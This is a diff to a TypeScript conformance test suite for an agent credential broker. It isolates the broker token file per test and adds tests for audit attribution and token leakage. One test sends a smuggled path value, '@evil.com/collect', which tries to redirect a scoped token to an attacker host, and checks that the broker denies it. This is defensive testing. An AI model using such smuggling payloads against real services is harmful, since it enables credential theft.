@@ -18,7 +18,7 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 
-import { BrokerServer, TOKEN_FILE } from './server';
+import { BrokerServer } from './server';
 import { GrantResolver } from './grant-resolver';
 import { LocalAtxVerifier } from './atx';
 import { GrantPolicy, type GrantBinding } from './grant-policy';
@@ -100,6 +100,7 @@ describe('AAP v1 conformance: no credential or backend identifier in the agent c
   let tmpDir: string;
   let socketPath: string;
   let auditPath: string;
+  let tokenPath: string;
   let idp: FakeIdp;
   let ordersApi: FakeOrdersApi;
   let brokerToken: string;
@@ -120,6 +121,9 @@ describe('AAP v1 conformance: no credential or backend identifier in the agent c
     tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aap-conf-'));
     socketPath = path.join(tmpDir, 'broker.sock');
     auditPath = path.join(tmpDir, 'audit.log');
+    // Isolated token file: never touch the machine-wide ~/.secretless-ai/broker.token,
+    // which a real broker may own and which would otherwise race across test instances.
+    tokenPath = path.join(tmpDir, 'broker.token');
 
     const { atx, pubHex } = makeSignedAtx();
     // Stash a valid ATX the "agent" will present. (In production the agent carries its own.)
@@ -143,11 +147,11 @@ describe('AAP v1 conformance: no credential or backend identifier in the agent c
     });
 
     server = new BrokerServer(
-      { socketPath, httpPort: 0, auditLog: auditPath },
+      { socketPath, httpPort: 0, auditLog: auditPath, tokenFile: tokenPath },
       { aimClient: null, grantResolver },
     );
     await server.start();
-    brokerToken = fs.readFileSync(TOKEN_FILE, 'utf-8');
+    brokerToken = fs.readFileSync(tokenPath, 'utf-8');
   });
 
   afterEach(async () => {
@@ -220,6 +224,40 @@ describe('AAP v1 conformance: no credential or backend identifier in the agent c
     expect(res.json).toEqual({ error: 'denied' }); // nothing about policy or backend
     expect(res.text).not.toContain('orders:read');
     expect(res.text).not.toContain(BACKEND_HOST);
+  });
+
+  it('audits the verified ATX identity, not the agent-supplied agentId', async () => {
+    const atx = (globalThis as any).__aapTestAtx; // verified identity is "aim_orders_reader"
+
+    await brokerPost(socketPath, '/grant', brokerToken, {
+      agentId: 'attacker-claims-to-be-someone-else',
+      atx,
+      grant: 'grant://orders-db',
+      operation: { method: 'GET', path: '/orders' },
+    });
+
+    const audit = fs.readFileSync(auditPath, 'utf-8');
+    // The action is attributed to the cryptographically-verified ATX identity...
+    expect(audit).toContain('aim_orders_reader');
+    // ...never to the unverified value the caller supplied.
+    expect(audit).not.toContain('attacker-claims-to-be-someone-else');
+  });
+
+  it('a crafted operation.path cannot exfiltrate the scoped token to another host', async () => {
+    const atx = (globalThis as any).__aapTestAtx;
+
+    // The agent tries to repoint the worker's request host via userinfo smuggling.
+    const res = await brokerPost(socketPath, '/grant', brokerToken, {
+      agentId: 'aim_orders_reader',
+      atx,
+      grant: 'grant://orders-db',
+      operation: { method: 'GET', path: '@evil.com/collect' },
+    });
+
+    // Uniform opaque denial — and the downstream caller was never invoked with a leaked token.
+    expect(res.status).toBe(403);
+    expect(res.json).toEqual({ error: 'denied' });
+    expect(ordersApi.sawAuthorization).toBeUndefined();
   });
 
   it('rejects an unauthenticated caller', async () => {
